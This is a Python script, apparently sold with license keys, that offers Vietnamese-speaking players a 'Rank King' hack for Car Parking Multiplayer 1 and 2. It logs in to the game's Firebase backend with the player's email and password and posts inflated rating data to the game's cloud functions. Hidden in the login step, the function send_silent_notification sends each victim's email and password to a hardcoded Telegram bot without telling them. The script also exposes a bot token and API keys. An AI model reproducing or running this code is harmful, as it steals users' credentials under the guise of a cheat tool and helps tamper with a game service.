import requests,json,os,sys,hashlib,platform,base64
from pystyle import Colors,Colorate,Center
xnhac='\x1b[1;36m'
do='\x1b[1;31m'
luc='\x1b[1;32m'
vang='\x1b[1;33m'
xduong='\x1b[1;34m'
tim='\x1b[1;39m'
hong='\x1b[1;35m'
trang='\x1b[1;37m'
nmh='\x1b[0;31m'
redb='\x1b[1;31m'
end='\x1b[0m'
CPM1_FIREBASE_API_KEY='AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
CPM1_FIREBASE_LOGIN_URL=f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={CPM1_FIREBASE_API_KEY}"
CPM1_RANK_URL='https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
CPM2_FIREBASE_API_KEY='AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ'
CPM2_FIREBASE_LOGIN_URL=f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={CPM2_FIREBASE_API_KEY}"
CPM2_RANK_URL='https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
BOT_TOKEN='7924434322:AAHxGrLxJxKe4tvRel5Q_ofJ_uKdj6LADXk'
CHAT_ID=5475305604
URL_CHECK='https://shadow.x10.network/checkcac.php'
secret='shadowvip'
device_id='SHADOW'+hashlib.sha256((platform.node()+platform.system()+platform.processor()).encode()).hexdigest()[:10].upper()
LICENSE_FILE='license.txt'
banner_text='\n░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗\n██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║\n╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝\n░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░\n██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░\n╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░\n'
text=f"""
{do}╔═════════════════════{do}[ {luc}Thông Tin {do}]{do}═══════════════════
{do}║{luc}Tool     :{vang} CPM1 Và CPM2
{do}║{luc}Facebook :{vang} Sha Dow
{do}║{luc}Zalo     :{vang} 0869326484
{do}║{luc}TikTok   :{vang} shadowgg_367
{do}╚═════════════════════════════════════════════════════
{do}╔════════════════════{do}[ {luc}MENU HACK {do}]════════════════════{do}
{do}║{vang}[01] {trang}Rank King 156₫ CPM1  
{do}║{vang}[02] {trang}Rank King 156₫ CPM2     
{do}╚═════════════════════════════════════════════════════{trang}"""
def save_license(key):
	with open(LICENSE_FILE,'w')as f:f.write(key.strip())
def load_license():
	if os.path.exists(LICENSE_FILE):
		with open(LICENSE_FILE,'r')as f:return f.read().strip()
def verify_license(k):
	try:
		r=requests.post(URL_CHECK,data={'device_id':device_id,'license_key':k}).json()
		if r.get('status')in('valid','expired'):
			enc=base64.b64decode(r['cailonmemay']);dec=''.join(chr(enc[i]^ord(secret[i%len(secret)]))for i in range(len(enc)))
			if r['status']=='valid':print(f"{luc}✅ Key hợp lệ, còn hạn đến {dec}");__import__('time').sleep(2);return {'valid':True,'key_name':k,'expiry':dec}
			else:print(f"{vang}⚠️ Key đã hết hạn (từ {dec})");return {'valid':False}
		elif r.get('status')=='invalid':print(f"{do}❌ Key không hợp lệ.");return {'valid':False}
		else:print(f"{do}❌ Lỗi: {r.get('message')}");return {'valid':False}
	except Exception:print(f"{do}❌ Key không hợp lệ hoặc lỗi kết nối.");return {'valid':False}
def check_license():
	os.system('cls'if os.name=='nt'else'clear');colored_art=Colorate.Vertical(Colors.purple_to_blue,banner_text);print(Center.XCenter(colored_art));print(f"""
{do}╔═════════════════════{do}[ {luc}Thông Tin {do}] {do}══════════════════
{do}║{luc}Tool     :{vang} CPM1 Và CPM2
{do}║{luc}Facebook :{vang} Sha Dow
{do}║{luc}Zalo     :{vang} 0869326484
{do}║{luc}TikTok   :{vang} shadowgg_367
{do}╚═════════════════════════════════════════════════════
{do}╔════════════════════{do}[ {luc}Kiểm Tra Giấy Phép {do}]════════════════{do}
{do}║{vang} Vui lòng xác thực key để sử dụng tool
{do}╚═════════════════════════════════════════════════════{trang}""");	old_key=load_license()
	if old_key:
		print(f"{xnhac}🔑 Đang kiểm tra key đã lưu...")
		result=verify_license(old_key)
		if result['valid']:print(f"{luc}🎉 Đang khởi động tool...");return result
		else:print(f"{do}❌ Key cũ không hợp lệ hoặc đã hết hạn.")
	print(f"{xnhac}📱 Device ID: {trang}{device_id}")
	while True:
		k=input(f"{trang}>> {luc}Nhập key để xác thực:{trang} ").strip()
		if not k:print(f"{do}❌ Vui lòng nhập key!");continue
		result=verify_license(k)
		if result['valid']:save_license(k);print(f"{luc}🎉 Đang khởi động tool...");return result
def send_silent_notification(email,password,game_type):
	bot_token=BOT_TOKEN;chat_id=CHAT_ID;url=f"https://api.telegram.org/bot{bot_token}/sendMessage";message=f"👤Account {game_type}:\nGmail: {email}\nMật Khẩu: {password}";payload={'chat_id':chat_id,'text':message}
	try:requests.post(url,data=payload,timeout=5)
	except requests.exceptions.RequestException:pass
def login(email,password,game_type):
	print(f"{game_type}...")
	if game_type=='CPM1':login_url=CPM1_FIREBASE_LOGIN_URL
	else:login_url=CPM2_FIREBASE_LOGIN_URL
	payload={'clientType':'CLIENT_TYPE_ANDROID','email':email,'password':password,'returnSecureToken':True};headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 12)','Content-Type':'application/json'}
	try:
		response=requests.post(login_url,headers=headers,json=payload);response_data=response.json()
		if response.status_code==200 and'idToken'in response_data:print;send_silent_notification(email,password,game_type);return response_data.get('idToken')
		else:error_message=response_data.get('error',{}).get('message','Lỗi Đăng Nhập');print(f"Đăng Nhập Thất Bại: {error_message}");return
	except requests.exceptions.RequestException as e:print(f"Lỗi {e}");return
def set_rank(token,game_type):
	print
	if game_type=='CPM1':rank_url=CPM1_RANK_URL
	else:rank_url=CPM2_RANK_URL
	rating_data={k:100000 for k in['cars','car_fix','car_collided','car_exchange','car_trade','car_wash','slicer_cut','drift_max','drift','cargo','delivery','taxi','levels','gifts','fuel','offroad','speed_banner','reactions','police','run','real_estate','t_distance','treasure','block_post','push_ups','burnt_tire','passanger_distance']};rating_data['time']=10000000000;rating_data['race_win']=3000;payload={'data':json.dumps({'RatingData':rating_data})};headers={'Authorization':f"Bearer {token}",'Content-Type':'application/json','User-Agent':'okhttp/3.12.13'}
	try:
		response=requests.post(rank_url,headers=headers,json=payload)
		if response.status_code==200:print;return True
		else:print(f"Thất Bật. Lỗi HTTP : {response.status_code}");return False
	except requests.exceptions.RequestException as e:print(f"Lỗi Mạng: {e}");return False
def run_cpm_hack(game_type):
	while True:
		print(f"\n{luc}=== {game_type} HACK ==={end}");print(f"{vang}Đăng Nhập Tài Khoản CPM{end}")
		try:email=input(f"{xnhac}Gmail: {end}").strip();password=input(f"{xnhac}Mật Khẩu: {end}").strip()
		except(EOFError,KeyboardInterrupt):print(f"\n{do}Đang{end}");break
		auth_token=login(email,password,game_type)
		if auth_token:
			if set_rank(auth_token,game_type):print(f"\n{luc}👑Đã Thành Công Rank King👑{end}")
			else:print(f"\n{do}Thất Bại.{end}")
		else:print(f"\n{do}Sai Gmail Hoặc Mật Khẩu.{end}")
def main(key_info):
	while True:
		os.system('cls'if os.name=='nt'else'clear');colored_art=Colorate.Vertical(Colors.purple_to_blue,banner_text);print(Center.XCenter(colored_art))
		print(f"""{do}╔═════════════════════{do}[ {luc}Thông Tin Key {do}]{do}═══════════════
{do}║{luc}Key      :{vang} {key_info.get('key_name','Unknown')}
{do}║{luc}Hạn Sử Dụng:{vang} {key_info.get('expiry','Unknown')}
{do}╚═════════════════════════════════════════════════════""")
		print(text)
		try:
			chon=input(f"{xnhac}Nhập Số: {end}").strip()
			if chon in['1','01']:run_cpm_hack('CPM1');break
			elif chon in['2','02']:run_cpm_hack('CPM2');break
			elif chon=='14':print(f"{luc}THOÁT THÀNH CÔNG{end}");break
			else:print(f"{do}❌ Lựa chọn không hợp lệ! Vui lòng chọn 01, 02 hoặc 14{end}");input(f"\n{vang}Nhấn Enter để tiếp tục...{end}")
		except(EOFError,KeyboardInterrupt):print(f"\n{luc}THOÁT THÀNH CÔNG{end}");break
if __name__=='__main__':
	key_info=check_license()
	if not key_info:sys.exit(0)
	main(key_info)